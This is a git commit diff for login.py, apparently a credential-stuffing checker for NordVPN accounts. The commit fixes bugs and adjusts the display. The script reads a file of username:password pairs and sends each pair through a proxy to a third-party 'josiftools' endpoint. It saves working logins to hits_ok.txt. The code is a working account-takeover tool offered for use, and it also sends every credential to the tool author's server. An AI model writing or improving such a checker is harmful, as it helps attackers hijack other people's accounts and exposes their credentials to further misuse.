0de26effc05a4e917a79b3f95839b1a9a7907703
Md Josif Khan <116228250+josifkhang@users.noreply.github.com>
2025-08-16 08:48:06 +0600

    Update login.py

--- login.py
+++ login.py
@@ -1,7 +1,7 @@
 # <coded by @josifkhan>
 # WHATSAPP: +8801868608046
 # -----------------------------------------------
-import requests,sys
+import requests,sys,os
 # colors
 rd  = "\033[1;31m"
 yl  = "\033[1;33m"
@@ -9,11 +9,13 @@ grn = "\033[1;32m"
 en  = "\033[0m"
 ok  = [0]
 tts = [0]
-xa  = 0
+xa  = []
 # ----------------------------------------------
 class NORDVPN:
+	def __init__(self):
+		os.system("cls")
 	def login(selfy,user,password,proxy_url):
-		sys.stdou.write(f"\r{grn}◩\033[1;35mCHECKING]: {xa}/{grn}{ok[0]}{en}/{tts[0]}")
+		sys.stdout.write(f"\r⬛CHECKING]: {len(xa)}/{grn}{ok[0]}{en}/{tts[0]}")
 		with requests.Session() as session:
 			url = "https://nordvpn.josiftools.com/nordlogin"
 			params = {
@@ -22,23 +24,24 @@ class NORDVPN:
 				"proxies": proxy_url,
 			}
 			try:
-				response = session.get(url, params=params, timeout=10);xa+=1
+				response = session.get(url, params=params, timeout=10);xa.append('a')
 				return response.json()
-			except requests.exceptions.RequestException as e:print("Error:", e);return {"message":"Error"}
+			except Exception as e:print("Error:", e);return {"message":"Error","status":"badd"}
 	def main(self):
-		with open(input(f"{grn}◩{rd}Enter filename{en}: "),"r") as f:accounts=f.readlines();tts[0]=len(accounts)
+		with open(input(f"⬛{rd}Enter filename{en}: "),"r") as f:accounts=f.readlines();tts[0]=len(accounts)
+		print("-"*60)
 		for account in accounts:
 			user     = account.split(":")[0].strip()
 			password = account.split(":")[1].strip()
 			proxy_url= "http://username:password@host:port"
 			response = self.login(user=user,password=password,proxy_url=proxy_url)
 			if response['status']=='no':
-				print(f'\r{grn}◩{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
+				print(f'\r⬛{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
 			elif response['status']=='ok':
-				print(f'\r{grn}◩{grn}{user}:{password}{en}=>{yl}{response["message"]}{en}')
+				print(f'\r⬛{grn}{user}:{password}{en}=>{yl}{response["message"]}{en}')
 				ok[0] = '1'
 				with open("hits_ok.txt","a") as f2:f2.write(f"{user}:{password}\n")
-			else:print(f'\r{grn}◩{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
+			else:print(f'\r⬛{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
 
 # -----------------------------------------------------------------------
 email     = "user_email@josiftools.com"
